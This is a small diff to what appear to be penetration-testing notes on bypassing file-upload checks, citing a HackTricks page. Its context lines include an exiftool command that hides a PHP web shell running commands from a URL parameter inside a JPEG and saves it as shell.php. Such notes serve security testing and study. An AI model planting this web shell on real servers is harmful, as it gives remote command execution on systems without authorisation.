@@ -27,7 +27,7 @@ https://book.hacktricks.xyz/pentesting-web/file-upload
 3. Change the extension to match what the application is expecting.
 4. Browse to your file, is it executed?
 
-#Is it scanning the content?
+#Insert the payload directly inside a real valid file type it is accepting. This will apply the signature at the start.
 exiftool -Comment="<?php system($_GET['cmd']); ?>" <YOUR-INPUT-IMAGE>.jpg -o shell.php
 ```
 
